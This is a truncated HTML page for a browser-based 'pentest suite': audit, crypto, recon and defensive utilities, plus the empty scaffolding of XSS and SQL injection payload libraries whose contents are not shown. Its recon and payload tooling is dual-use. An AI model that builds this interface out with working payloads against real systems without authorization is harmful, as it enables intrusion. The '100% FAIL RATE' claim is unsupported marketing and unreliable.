<!DOCTYPE html>
<!-- TRIPOD-IP-v1.0 | DLW | TriPod LLC | 2026-02-18 | SHA256:02880745b847317c4e2424524ec25d0f7a2b84368d184586f45b54af9fcab763 -->
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="author" content="David Lee Wise | TriPod LLC">
<meta name="ip-watermark" content="TRIPOD-IP-v1.0 | DLW | 2026-02-18">
<title>TOPH PENTEST SUITE v1.0 | TriPod LLC</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600&display=swap');

  /* TRIPOD-IP-v1.0 | DLW | TriPod LLC | 2026-02-18 */
  :root {
    --neon-green: #00ffe5;
    --neon-purple: #ee00ff;
    --neon-cyan: #00ffff;
    --bg-deep: #020d0d;
    --bg-teal: #041a1a;
    --glass-bg: rgba(0,255,229,0.04);
    --glass-border: rgba(0,255,229,0.18);
    --glass-hover: rgba(0,255,229,0.08);
    --text-primary: #c8fff8;
    --text-dim: #5a9e98;
    --danger: #ff3366;
    --warn: #ffaa00;
    --success: #00ff88;
    --panel-shadow: 0 0 30px rgba(0,255,229,0.08), 0 0 1px rgba(0,255,229,0.4);
  }

  * { margin:0; padding:0; box-sizing:border-box; }

  body {
    background: var(--bg-deep);
    color: var(--text-primary);
    font-family: 'Share Tech Mono', monospace;
    min-height: 100vh;
    overflow-x: hidden;
    cursor: none;
  }

  /* MATRIX RAIN CANVAS */
  #rain-canvas {
    position: fixed; top:0; left:0;
    width:100%; height:100%;
    pointer-events: none;
    z-index: 0;
    opacity: 0.18;
  }

  /* CURSOR TRAIL */
  .cursor-dot {
    position: fixed;
    width: 8px; height: 8px;
    background: var(--neon-green);
    border-radius: 50%;
    pointer-events: none;
    z-index: 9999;
    transition: transform 0.1s ease;
    box-shadow: 0 0 10px var(--neon-green), 0 0 20px var(--neon-green);
    transform: translate(-50%, -50%);
  }
  .cursor-trail {
    position: fixed;
    width: 4px; height: 4px;
    border-radius: 50%;
    pointer-events: none;
    z-index: 9998;
    transform: translate(-50%, -50%);
  }

  /* LAYOUT */
  #app {
    position: relative;
    z-index: 1;
    max-width: 1400px;
    margin: 0 auto;
    padding: 20px;
  }

  /* HEADER */
  .suite-header {
    text-align: center;
    padding: 30px 20px 20px;
    position: relative;
  }
  .suite-title {
    font-family: 'Orbitron', monospace;
    font-size: 2.4rem;
    font-weight: 900;
    letter-spacing: 0.15em;
    background: linear-gradient(90deg, var(--neon-green), var(--neon-cyan), var(--neon-purple));
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
    text-shadow: none;
    filter: drop-shadow(0 0 15px rgba(0,255,229,0.5));
  }
  .suite-sub {
    font-family: 'Rajdhani', sans-serif;
    font-size: 0.85rem;
    color: var(--text-dim);
    letter-spacing: 0.3em;
    margin-top: 6px;
  }
  .watermark {
    position: absolute;
    top: 10px; right: 20px;
    font-size: 0.6rem;
    color: var(--text-dim);
    opacity: 0.5;
    letter-spacing: 0.1em;
  }

  /* TAB NAVIGATION */
  .tab-nav {
    display: flex;
    flex-wrap: wrap;
    gap: 6px;
    justify-content: center;
    margin: 15px 0 25px;
  }
  .tab-btn {
    background: var(--glass-bg);
    border: 1px solid var(--glass-border);
    color: var(--text-dim);
    font-family: 'Share Tech Mono', monospace;
    font-size: 0.75rem;
    padding: 8px 16px;
    cursor: pointer;
    letter-spacing: 0.1em;
    transition: all 0.2s;
    clip-path: polygon(8px 0%, 100% 0%, calc(100% - 8px) 100%, 0% 100%);
  }
  .tab-btn:hover {
    background: var(--glass-hover);
    color: var(--neon-green);
    border-color: var(--neon-green);
    box-shadow: 0 0 12px rgba(0,255,229,0.2);
  }
  .tab-btn.active {
    background: rgba(0,255,229,0.12);
    color: var(--neon-green);
    border-color: var(--neon-green);
    box-shadow: 0 0 20px rgba(0,255,229,0.3);
  }

  /* PANELS */
  .tab-panel { display: none; }
  .tab-panel.active { display: block; }

  .panel-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(380px, 1fr));
    gap: 20px;
  }
  .panel-grid-3 {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
    gap: 20px;
  }

  .tool-card {
    background: var(--glass-bg);
    border: 1px solid var(--glass-border);
    padding: 20px;
    box-shadow: var(--panel-shadow);
    position: relative;
    overflow: hidden;
  }
  .tool-card::before {
    content: '';
    position: absolute;
    top: 0; left: 0;
    width: 3px; height: 100%;
    background: linear-gradient(180deg, var(--neon-green), transparent);
  }
  .tool-card.purple::before { background: linear-gradient(180deg, var(--neon-purple), transparent); }
  .tool-card.cyan::before { background: linear-gradient(180deg, var(--neon-cyan), transparent); }
  .tool-card.danger::before { background: linear-gradient(180deg, var(--danger), transparent); }
  .tool-card.warn::before { background: linear-gradient(180deg, var(--warn), transparent); }

  .card-title {
    font-family: 'Orbitron', monospace;
    font-size: 0.75rem;
    font-weight: 700;
    color: var(--neon-green);
    letter-spacing: 0.15em;
    margin-bottom: 14px;
    display: flex;
    align-items: center;
    gap: 8px;
  }
  .card-title.purple { color: var(--neon-purple); }
  .card-title.cyan { color: var(--neon-cyan); }
  .card-title.danger { color: var(--danger); }
  .card-title.warn { color: var(--warn); }

  /* FORM ELEMENTS */
  input[type="text"], input[type="url"], input[type="number"],
  textarea, select {
    width: 100%;
    background: rgba(0,0,0,0.4);
    border: 1px solid var(--glass-border);
    color: var(--text-primary);
    font-family: 'Share Tech Mono', monospace;
    font-size: 0.78rem;
    padding: 8px 12px;
    outline: none;
    transition: border-color 0.2s;
    resize: vertical;
  }
  input:focus, textarea:focus, select:focus {
    border-color: var(--neon-green);
    box-shadow: 0 0 8px rgba(0,255,229,0.15);
  }
  select option { background: #041a1a; }

  .btn {
    background: rgba(0,255,229,0.08);
    border: 1px solid var(--neon-green);
    color: var(--neon-green);
    font-family: 'Share Tech Mono', monospace;
    font-size: 0.75rem;
    padding: 8px 18px;
    cursor: pointer;
    letter-spacing: 0.1em;
    transition: all 0.2s;
    margin-top: 8px;
  }
  .btn:hover {
    background: rgba(0,255,229,0.18);
    box-shadow: 0 0 15px rgba(0,255,229,0.3);
  }
  .btn.purple {
    border-color: var(--neon-purple);
    color: var(--neon-purple);
    background: rgba(238,0,255,0.08);
  }
  .btn.purple:hover { background: rgba(238,0,255,0.18); box-shadow: 0 0 15px rgba(238,0,255,0.3); }
  .btn.cyan {
    border-color: var(--neon-cyan);
    color: var(--neon-cyan);
    background: rgba(0,255,255,0.08);
  }
  .btn.danger {
    border-color: var(--danger);
    color: var(--danger);
    background: rgba(255,51,102,0.08);
  }
  .btn.warn {
    border-color: var(--warn);
    color: var(--warn);
    background: rgba(255,170,0,0.08);
  }
  .btn-row { display: flex; gap: 8px; flex-wrap: wrap; margin-top: 8px; }

  /* OUTPUT AREAS */
  .output-box {
    background: rgba(0,0,0,0.5);
    border: 1px solid var(--glass-border);
    padding: 12px;
    font-size: 0.72rem;
    min-height: 60px;
    margin-top: 10px;
    word-break: break-all;
    line-height: 1.6;
    position: relative;
    max-height: 300px;
    overflow-y: auto;
  }
  .output-box::-webkit-scrollbar { width: 4px; }
  .output-box::-webkit-scrollbar-track { background: transparent; }
  .output-box::-webkit-scrollbar-thumb { background: var(--neon-green); }

  .result-line { margin: 3px 0; }
  .result-line.ok { color: var(--success); }
  .result-line.fail { color: var(--danger); }
  .result-line.warn { color: var(--warn); }
  .result-line.info { color: var(--neon-cyan); }
  .result-line.dim { color: var(--text-dim); }

  /* SCORE BAR */
  .score-bar-wrap { margin-top: 10px; }
  .score-label { font-size: 0.7rem; color: var(--text-dim); margin-bottom: 4px; display: flex; justify-content: space-between; }
  .score-bar {
    height: 6px;
    background: rgba(255,255,255,0.05);
    border: 1px solid var(--glass-border);
    overflow: hidden;
  }
  .score-fill {
    height: 100%;
    transition: width 0.5s ease, background 0.5s ease;
    box-shadow: 0 0 8px currentColor;
  }

  /* CHECKLIST */
  .checklist-item {
    display: flex;
    align-items: center;
    gap: 10px;
    padding: 6px 8px;
    border-bottom: 1px solid rgba(0,255,229,0.06);
    font-size: 0.72rem;
    cursor: pointer;
    transition: background 0.15s;
  }
  .checklist-item:hover { background: var(--glass-hover); }
  .check-icon { width: 14px; height: 14px; flex-shrink: 0; font-size: 0.8rem; }
  .check-text { flex: 1; }
  .check-status { font-size: 0.65rem; color: var(--text-dim); }

  /* CVSS */
  .cvss-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 8px; }
  .cvss-field label { font-size: 0.65rem; color: var(--text-dim); display: block; margin-bottom: 3px; }

  /* PAYLOAD TABLE */
  .payload-table { width: 100%; border-collapse: collapse; font-size: 0.7rem; }
  .payload-table th {
    background: rgba(0,255,229,0.08);
    color: var(--neon-green);
    padding: 6px 8px;
    text-align: left;
    font-size: 0.65rem;
    letter-spacing: 0.1em;
  }
  .payload-table td { padding: 5px 8px; border-bottom: 1px solid rgba(0,255,229,0.06); }
  .payload-table tr:hover td { background: var(--glass-hover); }
  .copy-cell { cursor: pointer; color: var(--neon-cyan); }
  .copy-cell:hover { text-shadow: 0 0 8px var(--neon-cyan); }

  /* STATUS BADGE */
  .badge {
    display: inline-block;
    padding: 2px 8px;
    font-size: 0.6rem;
    letter-spacing: 0.1em;
    border: 1px solid;
  }
  .badge.green { border-color: var(--success); color: var(--success); }
  .badge.red { border-color: var(--danger); color: var(--danger); }
  .badge.yellow { border-color: var(--warn); color: var(--warn); }
  .badge.blue { border-color: var(--neon-cyan); color: var(--neon-cyan); }

  /* ENTROPY METER */
  .entropy-display {
    font-family: 'Orbitron', monospace;
    font-size: 2rem;
    font-weight: 700;
    text-align: center;
    padding: 15px;
    letter-spacing: 0.1em;
  }

  /* DIVIDER */
  .divider {
    height: 1px;
    background: linear-gradient(90deg, transparent, var(--neon-green), transparent);
    margin: 12px 0;
    opacity: 0.4;
  }

  /* SECTION LABEL */
  .section-label {
    font-size: 0.65rem;
    color: var(--text-dim);
    letter-spacing: 0.2em;
    margin-bottom: 6px;
    margin-top: 10px;
  }

  /* PORT STATUS */
  .port-row {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 4px 8px;
    border-bottom: 1px solid rgba(0,255,229,0.05);
    font-size: 0.7rem;
  }
  .port-row:hover { background: var(--glass-hover); }

  /* CIDR TABLE */
  .cidr-result { font-size: 0.72rem; }
  .cidr-row { display: flex; justify-content: space-between; padding: 4px 0; border-bottom: 1px solid rgba(0,255,229,0.06); }
  .cidr-label { color: var(--text-dim); }
  .cidr-value { color: var(--neon-cyan); }

  /* RESPONSIVE */
  @media (max-width: 768px) {
    .suite-title { font-size: 1.5rem; }
    .panel-grid { grid-template-columns: 1fr; }
    .panel-grid-3 { grid-template-columns: 1fr; }
    .cvss-grid { grid-template-columns: 1fr; }
  }

  /* SCAN ANIMATION */
  @keyframes scanline {
    0% { top: -2px; }
    100% { top: 100%; }
  }
  .scanning::after {
    content: '';
    position: absolute;
    left: 0; top: 0;
    width: 100%;
    height: 2px;
    background: linear-gradient(90deg, transparent, var(--neon-green), transparent);
    animation: scanline 1.5s linear infinite;
  }

  /* GLOW PULSE */
  @keyframes glow-pulse {
    0%, 100% { opacity: 0.6; }
    50% { opacity: 1; }
  }
  .pulse { animation: glow-pulse 2s ease-in-out infinite; }

  /* FLICKER */
  @keyframes flicker { 0%,100%{opacity:1} 92%{opacity:1} 93%{opacity:0.4} 94%{opacity:1} }

  /* STATS ROW */
  .stats-row {
    display: flex;
    gap: 10px;
    flex-wrap: wrap;
    margin-bottom: 15px;
  }
  .stat-chip {
    background: var(--glass-bg);
    border: 1px solid var(--glass-border);
    padding: 6px 12px;
    font-size: 0.65rem;
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 2px;
    flex: 1;
    min-width: 80px;
  }
  .stat-chip .val {
    font-family: 'Orbitron', monospace;
    font-size: 1.1rem;
    font-weight: 700;
  }
  .stat-chip .lbl { color: var(--text-dim); letter-spacing: 0.1em; }

  /* COPY TOAST */
  #copy-toast {
    position: fixed;
    bottom: 30px; right: 30px;
    background: rgba(0,255,229,0.1);
    border: 1px solid var(--neon-green);
    color: var(--neon-green);
    padding: 8px 18px;
    font-size: 0.75rem;
    z-index: 9999;
    opacity: 0;
    transition: opacity 0.3s;
    pointer-events: none;
  }
  #copy-toast.show { opacity: 1; }
</style>
</head>
<body>

<canvas id="rain-canvas"></canvas>
<div class="cursor-dot" id="cursor-dot"></div>
<div id="copy-toast">âœ“ COPIED</div>

<div id="app">
  <div class="suite-header">
    <div class="watermark">TRIPOD-IP-v1.0 | DLW | TriPod LLC | 2026-02-18</div>
    <div class="suite-title">â—ˆ TOPH PENTEST SUITE â—ˆ</div>
    <div class="suite-sub">PENETRATION &amp; DEFENSIVE FRAMEWORK v1.0 | TRIPOD LLC | ETHICS FIRST</div>
  </div>

  <nav class="tab-nav">
    <button class="tab-btn active" onclick="switchTab('dragon')">ğŸ‰ FLAMING DRAGON</button>
    <button class="tab-btn" onclick="switchTab('crypto')">ğŸ” CRYPTO LAB</button>
    <button class="tab-btn" onclick="switchTab('recon')">ğŸŒ RECON</button>
    <button class="tab-btn" onclick="switchTab('defensive')">ğŸ›¡ï¸ DEFENSIVE</button>
    <button class="tab-btn" onclick="switchTab('payloads')">ğŸ’‰ PAYLOAD GEN</button>
    <button class="tab-btn" onclick="switchTab('toph')">â¬¡ TOPH AUDIT</button>
  </nav>

  <!-- =================== FLAMING DRAGON =================== -->
  <div id="tab-dragon" class="tab-panel active">
    <div class="panel-grid">

      <div class="tool-card danger">
        <div class="card-title danger">ğŸ‰ FLAMING DRAGON â€” ADA/CAN-SPAM AUDIT ENGINE</div>
        <div class="section-label">TARGET URL</div>
        <input type="text" id="fd-url" placeholder="https://target.com" />
        <div class="section-label">AUDIT SCOPE</div>
        <select id="fd-scope">
          <option value="full">FULL AUDIT (ADA + CAN-SPAM + WCAG + ARIA)</option>
          <option value="ada">ADA / WCAG 2.1 ONLY</option>
          <option value="canspam">CAN-SPAM / EMAIL COMPLIANCE</option>
          <option value="aria">ARIA / ACCESSIBILITY</option>
        </select>
        <div class="btn-row">
          <button class="btn danger" onclick="runFlamingDragon()">â–¶ EXECUTE AUDIT</button>
          <button class="btn" onclick="clearOutput('fd-output')">CLR</button>
        </div>
        <div class="output-box scanning" id="fd-output" style="min-height:220px;">
          <span class="result-line dim">[ FLAMING DRAGON READY â€” ENTER TARGET URL ]</span><br>
          <span class="result-line dim">[ METHODOLOGY: 60+ TARGETS, 100% FAIL RATE, &lt;5 MIN ]</span>
        </div>
      </div>

      <div class="tool-card danger">
        <div class="card-title danger">ğŸ“‹ ADA VIOLATION CHECKLIST</div>
        <div id="ada-checklist">
          <!-- populated by JS -->
        </div>
        <div class="divider"></div>
        <div id="ada-score-wrap" class="score-bar-wrap">
          <div class="score-label"><span>COMPLIANCE SCORE</span><span id="ada-score-val">â€”</span></div>
          <div class="score-bar"><div class="score-fill" id="ada-score-bar" style="width:0%;background:var(--success)"></div></div>
        </div>
      </div>

      <div class="tool-card">
        <div class="card-title">ğŸ“§ CAN-SPAM VECTOR CHECKLIST</div>
        <div id="canspam-checklist"><!-- populated by JS --></div>
        <div class="divider"></div>
        <div class="score-bar-wrap">
          <div class="score-label"><span>CAN-SPAM COMPLIANCE</span><span id="cs-score-val">â€”</span></div>
          <div class="score-bar"><div class="score-fill" id="cs-score-bar" style="width:0%;background:var(--success)"></div></div>
        </div>
      </div>

      <div class="tool-card warn">
        <div class="card-title warn">ğŸ“Š AUDIT INVOICE GENERATOR</div>
        <div class="section-label">ENGAGEMENT DETAILS</div>
        <input type="text" id="inv-target" placeholder="Target Organization" style="margin-bottom:6px;" />
        <input type="text" id="inv-date" placeholder="Date (YYYY-MM-DD)" style="margin-bottom:6px;" />
        <input type="number" id="inv-hours" placeholder="Total Hours" style="margin-bottom:6px;" />
        <input type="number" id="inv-rate" placeholder="Rate per Hour ($)" style="margin-bottom:6px;" />
        <select id="inv-type" style="margin-bottom:6px;">
          <option value="ada">ADA Compliance Audit</option>
          <option value="canspam">CAN-SPAM Audit</option>
          <option value="pentest">Penetration Test</option>
          <option value="toph">TOPH Framework Audit</option>
          <option value="full">Full Suite Engagement</option>
        </select>
        <button class="btn warn" onclick="generateInvoice()">â¬¡ GENERATE INVOICE</button>
        <div class="output-box" id="inv-output" style="min-height:140px; font-size:0.68rem;">
          <span class="result-line dim">[ INVOICE GENERATOR READY ]</span>
        </div>
        <button class="btn" onclick="copyOutput('inv-output')" style="margin-top:6px;">COPY INVOICE</button>
      </div>

    </div>
  </div>

  <!-- =================== CRYPTO LAB =================== -->
  <div id="tab-crypto" class="tab-panel">
    <div class="panel-grid">

      <div class="tool-card purple">
        <div class="card-title purple">ğŸ”‘ HASH GENERATOR</div>
        <textarea id="hash-input" rows="4" placeholder="Enter text to hash..."></textarea>
        <div class="btn-row">
          <button class="btn purple" onclick="genHash('SHA-256')">SHA-256</button>
          <button class="btn purple" onclick="genHash('SHA-384')">SHA-384</button>
          <button class="btn purple" onclick="genHash('SHA-512')">SHA-512</button>
          <button class="btn purple" onclick="genHash('SHA-1')">SHA-1</button>
        </div>
        <div class="output-box" id="hash-output" style="min-height:120px;">
          <span class="result-line dim">[ SELECT ALGORITHM TO HASH INPUT ]</span>
        </div>
        <button class="btn" onclick="copyOutput('hash-output')" style="font-size:0.65rem;">COPY HASH</button>
      </div>

      <div class="tool-card purple">
        <div class="card-title purple">ğŸ”’ BASE64 ENCODER / DECODER</div>
        <textarea id="b64-input" rows="3" placeholder="Input text or Base64..."></textarea>
        <div class="btn-row">
          <button class="btn purple" onclick="b64encode()">ENCODE â†’</button>
          <button class="btn purple" onclick="b64decode()">â† DECODE</button>
          <button class="btn" onclick="clearIO('b64-input','b64-output')">CLR</button>
        </div>
        <div class="output-box" id="b64-output" style="min-height:80px;"><span class="result-line dim">[ OUTPUT ]</span></div>
        <div class="divider"></div>
        <div class="card-title purple" style="margin-top:10px;">ğŸ”‘ HEX ENCODER / DECODER</div>
        <textarea id="hex-input" rows="2" placeholder="Text or hex string..."></textarea>
        <div class="btn-row">
          <button class="btn purple" onclick="hexEncode()">â†’ HEX</button>
          <button class="btn purple" onclick="hexDecode()">HEX â†’</button>
        </div>
        <div class="output-box" id="hex-output" style="min-height:50px;"><span class="result-line dim">[ OUTPUT ]</span></div>
      </div>

      <div class="tool-card purple">
        <div class="card-title purple">ğŸ« JWT DECODER</div>
        <textarea id="jwt-input" rows="3" placeholder="Paste JWT token here..."></textarea>
        <button class="btn purple" onclick="decodeJWT()">DECODE JWT</button>
        <div class="output-box" id="jwt-output" style="min-height:160px;"><span class="result-line dim">[ PASTE JWT TO ANALYZE ]</span></div>
      </div>

      <div class="tool-card purple">
        <div class="card-title purple">ğŸ“Š ENTROPY CALCULATOR</div>
        <textarea id="entropy-input" rows="3" placeholder="Enter string to measure entropy..."></textarea>
        <button class="btn purple" onclick="calcEntropy()">CALCULATE ENTROPY</button>
        <div class="entropy-display" id="entropy-val" style="color:var(--neon-purple);">â€”</div>
        <div class="output-box" id="entropy-output" style="min-height:80px;"><span class="result-line dim">[ ENTROPY ANALYSIS ]</span></div>
        <div class="score-bar-wrap" style="margin-top:8px;">
          <div class="score-label"><span>ENTROPY STRENGTH</span><span id="entropy-label">â€”</span></div>
          <div class="score-bar"><div class="score-fill" id="entropy-bar" style="width:0%;background:var(--neon-purple)"></div></div>
        </div>
      </div>

      <div class="tool-card purple">
        <div class="card-title purple">ğŸ”€ ROT / CAESAR CIPHER</div>
        <textarea id="rot-input" rows="2" placeholder="Text to encode/decode..."></textarea>
        <div class="section-label">ROTATION (1-25)</div>
        <input type="number" id="rot-n" value="13" min="1" max="25" />
        <div class="btn-row">
          <button class="btn purple" onclick="rotCipher()">APPLY ROT</button>
          <button class="btn purple" onclick="rotBrute()">BRUTE ALL</button>
        </div>
        <div class="output-box" id="rot-output" style="min-height:100px; max-height:200px;"><span class="result-line dim">[ ROT OUTPUT ]</span></div>
      </div>

      <div class="tool-card purple">
        <div class="card-title purple">ğŸ” PASSWORD HASHER (PBKDF2)</div>
        <input type="text" id="ph-pass" placeholder="Password to hash..." style="margin-bottom:6px;"/>
        <input type="text" id="ph-salt" placeholder="Salt (leave blank for random)" />
        <div class="btn-row">
          <button class="btn purple" onclick="pbkdf2Hash()">HASH PASSWORD</button>
        </div>
        <div class="output-box" id="ph-output" style="min-height:80px;"><span class="result-line dim">[ PBKDF2 OUTPUT ]</span></div>
      </div>

    </div>
  </div>

  <!-- =================== RECON =================== -->
  <div id="tab-recon" class="tab-panel">
    <div class="panel-grid">

      <div class="tool-card cyan">
        <div class="card-title cyan">ğŸŒ URL ANALYZER / PARSER</div>
        <input type="text" id="url-input" placeholder="https://example.com/path?query=val#hash" />
        <button class="btn cyan" onclick="analyzeURL()">ANALYZE URL</button>
        <div class="output-box" id="url-output" style="min-height:180px;"><span class="result-line dim">[ ENTER URL TO PARSE ]</span></div>
      </div>

      <div class="tool-card cyan">
        <div class="card-title cyan">ğŸ“¡ CIDR / IP CALCULATOR</div>
        <input type="text" id="cidr-input" placeholder="192.168.1.0/24 or 10.0.0.1/8" />
        <button class="btn cyan" onclick="calcCIDR()">CALCULATE</button>
        <div class="output-box cidr-result" id="cidr-output" style="min-height:180px;"><span class="result-line dim">[ ENTER CIDR NOTATION ]</span></div>
      </div>

      <div class="tool-card cyan">
        <div class="card-title cyan">ğŸ” HTTP HEADER ANALYZER</div>
        <textarea id="header-input" rows="6" placeholder="Paste raw HTTP headers here:&#10;Content-Type: text/html&#10;X-Frame-Options: DENY&#10;..."></textarea>
        <button class="btn cyan" onclick="analyzeHeaders()">ANALYZE HEADERS</button>
        <div class="output-box" id="header-output" style="min-height:160px;"><span class="result-line dim">[ PASTE HEADERS TO ANALYZE SECURITY POSTURE ]</span></div>
      </div>

      <div class="tool-card cyan">
        <div class="card-title cyan">ğŸ”Œ PORT REFERENCE DATABASE</div>
        <input type="text" id="port-search" placeholder="Search port or service..." oninput="searchPorts()" />
        <div class="output-box" id="port-output" style="min-height:220px; padding:0;">
          <!-- populated by JS -->
        </div>
      </div>

      <div class="tool-card cyan">
        <div class="card-title cyan">ğŸ“‹ SUBDOMAIN PATTERN GENERATOR</div>
        <input type="text" id="sd-domain" placeholder="example.com" style="margin-bottom:6px;"/>
        <select id="sd-wordlist">
          <option value="common">COMMON (admin, api, dev, staging, mail...)</option>
          <option value="cloud">CLOUD (aws, azure, gcp, cdn, static...)</option>
          <option value="infra">INFRA (vpn, proxy, bastion, git, ci...)</option>
          <option value="all">ALL CATEGORIES</option>
        </select>
        <button class="btn cyan" onclick="genSubdomains()">GENERATE LIST</button>
        <div class="output-box" id="sd-output" style="min-height:140px; max-height:220px;"><span class="result-line dim">[ OUTPUT ]</span></div>
        <button class="btn" onclick="copyOutput('sd-output')" style="font-size:0.65rem;">COPY LIST</button>
      </div>

      <div class="tool-card cyan">
        <div class="card-title cyan">ğŸ•µï¸ USER-AGENT GENERATOR</div>
        <select id="ua-type">
          <option value="browser">Modern Browser</option>
          <option value="mobile">Mobile</option>
          <option value="bot">Search Bot</option>
          <option value="pentest">Pentest Tool</option>
          <option value="legacy">Legacy / IE</option>
        </select>
        <button class="btn cyan" onclick="genUA()" style="margin-top:8px;">GENERATE UA</button>
        <div class="output-box" id="ua-output" style="min-height:80px;"><span class="result-line dim">[ OUTPUT ]</span></div>
        <button class="btn" onclick="copyOutput('ua-output')" style="font-size:0.65rem;">COPY UA</button>
      </div>

    </div>
  </div>

  <!-- =================== DEFENSIVE =================== -->
  <div id="tab-defensive" class="tab-panel">
    <div class="panel-grid">

      <div class="tool-card">
        <div class="card-title">ğŸ›¡ï¸ PASSWORD STRENGTH ANALYZER</div>
        <input type="text" id="pw-input" placeholder="Enter password to analyze..." oninput="analyzePW()" />
        <div class="score-bar-wrap" style="margin-top:10px;">
          <div class="score-label"><span>STRENGTH</span><span id="pw-strength-label">â€”</span></div>
          <div class="score-bar"><div class="score-fill" id="pw-strength-bar" style="width:0%;"></div></div>
        </div>
        <div class="output-box" id="pw-output" style="min-height:160px;"><span class="result-line dim">[ ANALYSIS OUTPUT ]</span></div>
        <div class="divider"></div>
        <div class="card-title" style="margin-top:5px;">ğŸ² SECURE PASSWORD GENERATOR</div>
        <div class="section-label">LENGTH</div>
        <input type="number" id="pwgen-len" value="20" min="8" max="128" style="margin-bottom:6px;"/>
        <div class="btn-row">
          <button class="btn" onclick="genPassword('all')">GENERATE STRONG</button>
          <button class="btn" onclick="genPassword('alphanum')">ALPHA-NUM</button>
          <button class="btn" onclick="genPassword('hex')">HEX</button>
        </div>
        <div class="output-box" id="pwgen-output" style="min-height:50px;"><span class="result-line dim">[ OUTPUT ]</span></div>
        <button class="btn" onclick="copyOutput('pwgen-output')" style="font-size:0.65rem;">COPY</button>
      </div>

      <div class="tool-card">
        <div class="card-title">ğŸ“Š CVSS v3.1 CALCULATOR</div>
        <div class="cvss-grid">
          <div class="cvss-field"><label>ATTACK VECTOR (AV)</label>
            <select id="cvss-av" onchange="calcCVSS()">
              <option value="0.85">NETWORK (N)</option>
              <option value="0.62">ADJACENT (A)</option>
              <option value="0.55">LOCAL (L)</option>
              <option value="0.20">PHYSICAL (P)</option>
            </select>
          </div>
          <div class="cvss-field"><label>ATTACK COMPLEXITY (AC)</label>
            <select id="cvss-ac" onchange="calcCVSS()">
              <option value="0.77">LOW (L)</option>
              <option value="0.44">HIGH (H)</option>
            </select>
          </div>
          <div class="cvss-field"><label>PRIVILEGES REQUIRED (PR)</label>
            <select id="cvss-pr" onchange="calcCVSS()">
              <option value="0.85">NONE (N)</option>
              <option value="0.62">LOW (L)</option>
              <option value="0.27">HIGH (H)</option>
            </select>
          </div>
          <div class="cvss-field"><label>USER INTERACTION (UI)</label>
            <select id="cvss-ui" onchange="calcCVSS()">
              <option value="0.85">NONE (N)</option>
              <option value="0.62">REQUIRED (R)</option>
            </select>
          </div>
          <div class="cvss-field"><label>SCOPE (S)</label>
            <select id="cvss-sc" onchange="calcCVSS()">
              <option value="U">UNCHANGED (U)</option>
              <option value="C">CHANGED (C)</option>
            </select>
          </div>
          <div class="cvss-field"><label>CONFIDENTIALITY (C)</label>
            <select id="cvss-ci" onchange="calcCVSS()">
              <option value="0.56">HIGH (H)</option>
              <option value="0.22">LOW (L)</option>
              <option value="0.00">NONE (N)</option>
            </select>
          </div>
          <div class="cvss-field"><label>INTEGRITY (I)</label>
            <select id="cvss-in" onchange="calcCVSS()">
              <option value="0.56">HIGH (H)</option>
              <option value="0.22">LOW (L)</option>
              <option value="0.00">NONE (N)</option>
            </select>
          </div>
          <div class="cvss-field"><label>AVAILABILITY (A)</label>
            <select id="cvss-av2" onchange="calcCVSS()">
              <option value="0.56">HIGH (H)</option>
              <option value="0.22">LOW (L)</option>
              <option value="0.00">NONE (N)</option>
            </select>
          </div>
        </div>
        <div class="entropy-display" id="cvss-score" style="color:var(--neon-green);">0.0</div>
        <div class="score-bar-wrap">
          <div class="score-label"><span>SEVERITY</span><span id="cvss-label">â€”</span></div>
          <div class="score-bar"><div class="score-fill" id="cvss-bar" style="width:0%;background:var(--success)"></div></div>
        </div>
        <div class="output-box" id="cvss-output" style="min-height:60px; margin-top:8px;"><span class="result-line dim">[ CVSS VECTOR STRING ]</span></div>
      </div>

      <div class="tool-card">
        <div class="card-title">ğŸ“œ LOG ANALYZER & THREAT DETECTOR</div>
        <textarea id="log-input" rows="6" placeholder="Paste log lines here...&#10;192.168.1.1 - - [18/Feb/2026:10:00:01] 'GET /admin HTTP/1.1' 403 ..."></textarea>
        <button class="btn" onclick="analyzeLogs()">ANALYZE LOGS</button>
        <div class="output-box" id="log-output" style="min-height:200px;"><span class="result-line dim">[ PASTE LOGS TO DETECT THREATS ]</span></div>
      </div>

      <div class="tool-card">
        <div class="card-title">ğŸ” REGEX TESTER & PATTERN LIBRARY</div>
        <input type="text" id="regex-pattern" placeholder="Regex pattern (e.g. \d{1,3}\.\d{1,3}...)" style="margin-bottom:6px;"/>
        <textarea id="regex-text" rows="4" placeholder="Test text..."></textarea>
        <div class="btn-row">
          <button class="btn" onclick="testRegex()">TEST PATTERN</button>
          <button class="btn" onclick="loadRegex('email')">EMAIL</button>
          <button class="btn" onclick="loadRegex('ip')">IP ADDR</button>
          <button class="btn" onclick="loadRegex('sqli')">SQLi</button>
          <button class="btn" onclick="loadRegex('xss')">XSS</button>
          <button class="btn" onclick="loadRegex('jwt')">JWT</button>
        </div>
        <div class="output-box" id="regex-output" style="min-height:100px;"><span class="result-line dim">[ MATCH RESULTS ]</span></div>
      </div>

    </div>
  </div>

  <!-- =================== PAYLOADS =================== -->
  <div id="tab-payloads" class="tab-panel">
    <div class="panel-grid">

      <div class="tool-card danger">
        <div class="card-title danger">ğŸ’‰ XSS PAYLOAD LIBRARY</div>
        <div class="section-label">FILTER BY CONTEXT</div>
        <select id="xss-ctx" onchange="loadPayloads('xss')">
          <option value="html">HTML Context</option>
          <option value="attr">Attribute Context</option>
          <option value="js">JavaScript Context</option>
          <option value="url">URL Context</option>
          <option value="filter">Filter Bypass</option>
        </select>
        <div style="overflow-x:auto; margin-top:8px;">
          <table class="payload-table" id="xss-table">
            <thead><tr><th>PAYLOAD</th><th>TYPE</th><th>COPY</th></tr></thead>
            <tbody id="xss-body"><!-- populated by JS --></tbody>
          </table>
        </div>
      </div>

      <div class="tool-card danger">
        <div class="card-title danger">ğŸ—ƒï¸ SQL INJECTION PAYLOAD LIBRARY</div>
        <select id="sqli-ctx" onchange="loadPayloads('sqli')">
          <option value="error">Error Based</option>
          <option value="blind">Blind / Boolean</option>
